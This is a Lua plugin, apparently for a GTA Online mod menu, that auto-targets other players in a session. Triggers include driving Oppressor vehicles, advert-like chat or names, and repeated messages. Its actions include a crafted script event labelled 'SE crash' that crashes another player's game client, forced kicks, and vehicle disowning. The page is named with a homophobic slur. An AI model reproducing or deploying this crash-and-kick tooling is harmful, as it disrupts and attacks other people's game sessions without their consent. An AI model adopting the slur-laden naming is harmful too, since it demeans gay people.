local TYPE_TAB, TYPE_TOGGLE, TYPE_SLIDER, TYPE_SELECTION, TYPE_BUTTON = 0, 1, 2, 3, 4

local PLAYER = {}

function PLAYER.GetPlayers(ignore)
	local names = {}
	local ids = {}

	for i = 0, 32 do
		if player.is_valid(i) and i ~= ignore then
			local name = player.get_name(i)
			names[name] = i
			ids[i] = name
		end
	end

	return names, ids
end

local bully = {
	["Ignore"] = function() end,
	["Delete"] = function(ply) player.vehicle_disown(ply) end,
	["Kick"] = function(ply) player.kick(ply) player.kick_brute(ply) end,
	["SE crash"] = function(ply) script.send(ply, 1757755807, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1) end,
	["Combine"] = function(ply) script.send(ply, 1757755807, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1) player.kick(ply) player.kick_brute(ply) end,
}

local PAGE = {}
PAGE.name = "Pidors"
PAGE.footer = "Get rid of *****"

PAGE.selection = 1

local function fuck(ply, id)
	local but = PAGE.buttons[id]
	local name = but[1]
	local val = but[3]
	local act = but[4][val]
	utils.notify("AntiPidors", "Using " .. act .. " on " .. player.get_name(ply) .. " | " .. name, gui_icon.triggerbot, notify_type.default)
	bully[act](ply)
end

local banned_vehicles = {
	[string.smart_joaat("OPPRESSOR")] = function(ply, name, veh)
		fuck(ply, 1)
	end,
	[string.smart_joaat("OPPRESSOR2")] = function(ply, name, veh)
		fuck(ply, 2)
	end,
}

local function CheckVehicle(id, name)
	local veh = player.get_vehicle_handle(id)
	if veh <= 0 then
		return
	end
	local hash = ENTITY.GET_ENTITY_MODEL(veh)
	local func = banned_vehicles[hash]
	if not func then
		return
	end
	func(id, name, veh)
end

local thinks = {
	function() -- Vehicles
		local names, ids = PLAYER.GetPlayers(player.index())

		for id, name in pairs(ids) do
			CheckVehicle(id, name)
		end
		return 5000
	end,
}

PAGE.buttons = {
	{"Opressor MK1", TYPE_SELECTION, 1, {"Ignore", "Delete", "Kick", "SE crash", "Combine"}},
	{"Opressor MK2", TYPE_SELECTION, 4, {"Ignore", "Delete", "Kick", "SE crash", "Combine"}},
	{"Adverts", TYPE_SELECTION, 4, {"Ignore", "Kick", "SE crash", "Combine"}},
	{"Adverts in name", TYPE_SELECTION, 4, {"Ignore", "Kick", "SE crash", "Combine"}},
	{"Chat spam", TYPE_SELECTION, 4, {"Ignore", "Kick", "SE crash", "Combine"}}
}

local calls = {}
PAGE.Think = function()
	local now = system.ticks()
	for k,v in ipairs(thinks) do
		local next_call = calls[k] or 0
		if now > next_call then
			local await = v(now) or 0
			calls[k] = now + await
		end
	end
end


local PIDORS = {}

PIDORS.Repeats = {
	LAST = {},
	NUM = {}
}

function PIDORS.Repeats.Check(index, text)
	if PIDORS.Repeats.LAST[index] == text then
		PIDORS.Repeats.NUM[index] = (PIDORS.Repeats.NUM[index] or 1) + 1
	else
		PIDORS.Repeats.NUM[index] = nil
	end
	PIDORS.Repeats.LAST[index] = text
	return PIDORS.Repeats.NUM[index] and PIDORS.Repeats.NUM[index] >= 3
end

PIDORS.Messages = {
	PHRASES = {
		"qq群",
		"q群",
		"gta5wr",
		"gtavkrutka",
		"lobby boost",
		"money,rp,unlocks",
		"gta5wz",
		"gta5kk",
		"gtakj",
		"gta5kf",
		"gtatf",
		"gtayz",
		"全网最低价", -- lowest price
		"包不封号", -- no ban
		"线上刷钱", -- money
		"微信", -- WeChat ( messenger )
		"gta[a-z]*%.[a-z]*", -- link pattern
		"www.*.[a-z]*", -- link pattern
		"//[a-z]*%.[a-z]*", -- link pattern
		"gta[0-9][0-9][0-9]*",
		"★",
		"先刷后付",
		"money*unlocks",
		"money*reviews"
	}
}
function PIDORS.Messages.Check(index, text)
	text = text:lower()
	for _, phrase in ipairs(PIDORS.Messages.PHRASES) do
		if text:find(phrase) ~= nil then
			return true
		end
	end
end

PIDORS.Names = {
	NAMES = {
		"gta5[a-z][a-z]",
		"gta[a-z][a-z]",
		"gta*_[0-9]*"
	}
}

function PIDORS.Names.Check(name)
	name = name:lower()
	for _, phrase in ipairs(PIDORS.Names.NAMES) do
		if name:find(phrase) ~= nil then
			return true
		end
	end
end

PAGE.OnChatMsg = function(ply, text)
	if ply == player.index() then return end
	if PIDORS.Messages.Check(ply, text) then
		fuck(ply, 3)
	end
	if PIDORS.Repeats.Check(ply, text) then
		fuck(ply, 5)
	end
end

PAGE.OnPlayerJoin = function(ply, name, rid, ip, host_key)
	if PIDORS.Names.Check(name, text) then
		fuck(ply, 4)
	end
end

return PAGE